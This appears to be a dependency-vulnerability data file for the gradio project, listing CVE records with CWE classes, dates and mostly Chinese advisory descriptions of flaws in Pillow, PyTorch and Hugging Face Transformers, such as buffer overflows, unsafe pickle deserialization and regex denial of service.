gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
